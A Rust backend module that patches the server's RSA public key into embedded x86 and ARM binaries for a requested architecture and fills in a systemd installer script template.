use std::path::PathBuf;
use std::sync::OnceLock;
use rsa::pkcs1::LineEnding;
use rsa::pkcs8::EncodePublicKey;
use crate::state::BackendState;

static GENERATOR: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/x86.bin"));
static REPL_GEN: OnceLock<Vec<u8>> = OnceLock::new();
static LOC: &str = env!("LOC");
pub fn get_repl_pos() -> usize {
	LOC.parse().unwrap()
}
static GENERATOR_ARM: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/arm.bin"));
static REPL_GEN_ARM: OnceLock<Vec<u8>> = OnceLock::new();
static LOC_ARM: &str = env!("LOC_ARM");
pub fn get_repl_pos_arm() -> usize {
	LOC_ARM.parse().unwrap()
}
pub fn get_generator(state: &BackendState, target: &str) -> &'static [u8] {
	let private = state.get_rsa_priv();
	let pub_key = private.as_public_key();
	let txt = pub_key.to_public_key_pem(LineEnding::LF).unwrap();
	let bytes = txt.into_bytes();
	if target.contains("x86") || target.eq("i386") || target.eq("amd64") {
		REPL_GEN.get_or_init(|| {
			let mut temp = Vec::from(GENERATOR);
			let start = get_repl_pos();
			temp[start..start + bytes.len()].copy_from_slice(bytes.as_slice());
			temp
		})
	} else if target.eq("arm") || target.contains("aarch64") {
		REPL_GEN_ARM.get_or_init(|| {
			let mut temp = Vec::from(GENERATOR_ARM);
			let start = get_repl_pos_arm();
			temp[start..start + bytes.len()].copy_from_slice(bytes.as_slice());
			temp
		})
	} else {
		panic!("no generator found for {}", target)
	}
}

pub fn get_systemd_setup_script(filename: &str, location: &str) -> Option<String> {
	Some(format!(include_str!("../systemd_installer.sh"), location, filename, filename))
}